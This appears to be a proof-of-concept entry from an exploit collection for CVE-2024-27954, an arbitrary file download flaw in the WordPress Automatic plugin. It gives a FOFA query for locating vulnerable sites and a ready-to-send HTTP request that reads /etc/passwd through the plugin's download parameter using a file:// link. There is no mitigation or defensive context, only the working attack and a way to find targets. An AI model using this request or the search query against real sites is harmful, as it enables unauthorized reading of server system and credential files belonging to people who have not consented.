## WordPress Automatic Plugin任意文件下载漏洞(CVE-2024-27954)

## fofa
```
"/wp-content/plugins/wp-automatic"
```

## poc
```
GET /?p=3232&wp_automatic=download&link=file:///etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

![8053915951936ca9109843fe4c581ce4](https://github.com/wy876/POC/assets/139549762/f5c6497f-29f9-47de-aa15-f072541a1d1b)
